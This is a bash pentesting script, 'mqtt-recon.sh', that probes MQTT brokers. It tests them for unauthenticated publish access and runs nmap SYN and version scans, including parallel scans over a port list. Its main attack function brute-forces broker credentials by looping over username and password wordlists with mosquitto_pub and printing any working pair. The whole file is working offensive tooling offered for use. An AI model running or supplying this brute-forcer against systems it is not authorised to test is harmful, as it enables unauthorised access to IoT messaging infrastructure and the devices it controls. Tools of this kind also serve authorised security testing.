#!/bin/bash

# Color variables
green='\033[0;32m'
yellow='\033[1;33m'
blue='\033[0;34m'
bold='\033[1m'
reset='\033[0m'

verbose=false

# Function to check if MQTT service is accessible
check_mqtt_service() {
    ip=$1
    port=$2
    
    echo -e "${blue}Checking MQTT service on ${ip}:${port}...${reset}"
    
    # Try without authentication
    mosquitto_pub -h $ip -p $port -t "test" -m "Testing MQTT service" &> /dev/null
    if [ $? -eq 0 ]; then
        echo -e "${green}MQTT service is accessible on ${ip}:${port} without authentication${reset}"
        return 0
    fi

    # If failed, service might require authentication
    echo -e "${yellow}MQTT service on ${ip}:${port} requires authentication.${reset}"
    echo -e "${yellow}Try brute-forcing with the -b option.${reset}"
    return 1
}

# Function to perform advanced scan using nmap
advanced_scan() {
    ip=$1
    port=$2
    
    echo -e "${blue}Performing advanced scan using nmap...${reset}"
    sudo nmap -p $port -sS -sV -sC $ip -v
}

# Function to perform parallel scanning of common ports
parallel_scan() {
    ip=$1
    
    echo -e "${blue}Performing parallel scanning of common ports...${reset}"
    if ! command -v parallel &> /dev/null; then
        echo -e "${yellow}Error: parallel command not found. Please install it.${reset}"
        exit 1
    fi

    if [ ! -f common_ports.txt ]; then
        echo -e "${yellow}Error: common_ports.txt file not found.${reset}"
        exit 1
    fi

    parallel -j 0 "sudo nmap -p {1} -sS -sV -sC $ip -v" ::: $(cat common_ports.txt)
}

# Function to perform brute-force attack
brute_force_attack() {
    ip=$1
    port=$2

    # Read wordlist paths from user
    read -p "Enter the path to the username wordlist file: " username_wordlist
    read -p "Enter the path to the password wordlist file: " password_wordlist

    if [ ! -f "$username_wordlist" ] || [ ! -f "$password_wordlist" ]; then
        echo -e "${yellow}Error: Username or password wordlist file not found.${reset}"
        exit 1
    fi

    echo -e "${blue}Performing brute-force attack on MQTT service...${reset}"
    while IFS= read -r username; do
        while IFS= read -r password; do
            if $verbose; then
                echo -e "${blue}Trying username: ${username} and password: ${password}${reset}"
            fi
            mosquitto_pub -h $ip -p $port -t "test" -m "Testing MQTT service" -u "$username" -P "$password" &> /dev/null
            if [ $? -eq 0 ]; then
                echo -e "${green}Successfully accessed MQTT service on ${ip}:${port} with username: ${username} and password: ${password}${reset}"
                return 0
            fi
        done < "$password_wordlist"
    done < "$username_wordlist"

    echo -e "${yellow}Failed to access MQTT service with the provided username and password wordlists.${reset}"
    return 1
}

# Function to display tool usage
display_usage() {
    echo -e "${bold}Usage:${reset}"
    echo -e "  mqtt-recon.sh <option> [ip] [port]"
    echo
    echo -e "${bold}Options:${reset}"
    echo "  -c, --check         Check MQTT service"
    echo "  -s, --scan          Perform advanced scan"
    echo "  -b, --bruteforce    Conduct brute-force attack"
    echo "  -h, --help          Display this help message"
}

# Main function
main() {
    echo -e "${blue}"
    echo "  ___  __________   _______ _____  "
    echo "  |  \/  |  _  \ \ / /_   _|  ___|"
    echo "  | .  . | | | |\ V /  | | | |__   "
    echo "  | |\/| | | | |/   \  | | |  __|  "
    echo "  | |  | \ \_/ / /^\ \_| |_| |___  "
    echo "  \_|  |_/\___/\/   \/\___/\____/  "
    echo "         The MQTT Pentester    "
    echo "         Author: aravind0x7    "
    echo -e "${reset}"

    if [ $# -eq 0 ]; then
        display_usage
        exit 1
    fi

    while [[ $# -gt 0 ]]; do
        case $1 in
            -c|--check)
                if [ $# -ne 3 ]; then
                    echo -e "${yellow}Error: IP address and port number are required.${reset}"
                    display_usage
                    exit 1
                fi
                check_mqtt_service $2 $3
                exit $?
                ;;
            -s|--scan)
                if [ $# -ne 3 ]; then
                    echo -e "${yellow}Error: IP address and port number are required.${reset}"
                    display_usage
                    exit 1
                fi
                advanced_scan $2 $3
                exit $?
                ;;
            -b|--bruteforce)
                if [ $# -ne 3 ]; then
                    echo -e "${yellow}Error: IP address and port number are required.${reset}"
                    display_usage
                    exit 1
                fi
                brute_force_attack $2 $3
                exit $?
                ;;
            -v|--verbose)
                verbose=true
                ;;
            -h|--help)
                display_usage
                exit 0
                ;;
            *)
                echo -e "${yellow}Error: Invalid option.${reset}"
                display_usage
                exit 1
                ;;
        esac
        shift
    done
}

# Execute main function with command-line arguments
main "$@"
